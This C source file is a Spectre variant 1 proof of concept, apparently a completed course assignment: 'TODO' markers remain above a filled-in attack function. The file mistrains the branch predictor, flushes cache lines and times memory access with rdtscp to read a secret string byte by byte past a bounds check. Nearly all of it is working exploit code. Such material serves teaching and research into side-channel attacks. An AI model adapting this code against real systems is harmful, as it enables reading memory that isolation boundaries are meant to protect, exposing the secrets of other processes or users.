#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include "shuffle_map.h"

#define THRESHOLD_RUNS 100000
#define ATTACK_RUNS 1000
#define VALID_RUNS 20
#define TRAINING_RUNS (VALID_RUNS * 10)

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

int find_threshold() {
  volatile unsigned int junk = 0; 
  uint64_t hits = 0, misses = 0;

  for(int i = 0; i < THRESHOLD_RUNS; i++){
    _mm_clflush(&junk);

    for (volatile int i = 0; i < 100; i++);
    _mm_mfence();
    uint64_t t0 = __rdtscp(&junk); 
    junk++;
    misses += __rdtscp(&junk) - t0;
  
    t0 = __rdtscp(&junk);
    junk++;
    hits += __rdtscp(&junk) - t0;
  }
  return (int)((hits + misses) / (2 * THRESHOLD_RUNS));
}

// used to prevent the compiler from optimizing out victim_function()
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

/**
 * Spectre Attack Function to Read Specific Byte.
 *
 * @param malicious_x The malicious x used to call the victim_function
 *
 * @param values      The two most likely guesses returned by your attack
 *
 * @param scores      The score (larger is better) of the two most likely guesses
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
  // TODO: Write this function
  static int threshold = 55; 
  if (!threshold)
    threshold = find_threshold();

  int hits[256] = {0};

  for (int run = 0; run < ATTACK_RUNS; run++){
    for(int i = 0; i < 256; i++)
      _mm_clflush(&array2[i * 512]);
    for (volatile int i = 0; i < 100; i++);
    _mm_mfence();

    for(int i = 1; i <= TRAINING_RUNS; i++) {
      size_t valid_x = run % array1_size;
      int is_attack = !(i % VALID_RUNS);
      size_t x = (malicious_x & -is_attack) | (valid_x & ~(-is_attack));

      _mm_clflush(&array1_size);
      for (volatile int i = 0; i < 100; i++);
      _mm_mfence();
      
      victim_function(x);
    }

    volatile unsigned int junk = 0;
    for (int i = 0; i < 256; i++) {
      int shuffled_i = forward[i];
      
      uint8_t* addr = array2 + shuffled_i * 512;
      uint64_t t0 = __rdtscp((uint32_t *)&junk);
      junk ^= *addr;
      uint64_t delta = __rdtscp((uint32_t *)&junk) - t0;

      if (delta < threshold)
        hits[shuffled_i] += 1;
    }
  }

  int first = -1, second = -1;
  for(int i = 0; i < 256; i++){
    if (first == -1 || hits[i] > hits[first]) {
      second = first;
      first = i;
    } else if (second == -1 || hits[i] > hits[second]) {
      second = i;
    }
  }
  // TODO: Report the real result
  value[0] = (uint8_t)first;
  value[1] = (uint8_t)second;
  score[0] = hits[first];
  score[1] = hits[second];
}

int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1); /* read the secret */
  int score[2], len = strlen(secret);
  uint8_t value[2];

  // initialize array2 to make sure it is in its own physical page and
  // not in a copy-on-write zero page
  for (size_t i = 0; i < sizeof(array2); i++)
    array2[i] = 1; 

  // attack each byte of the secret, successively
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
  }
  return (0);
}
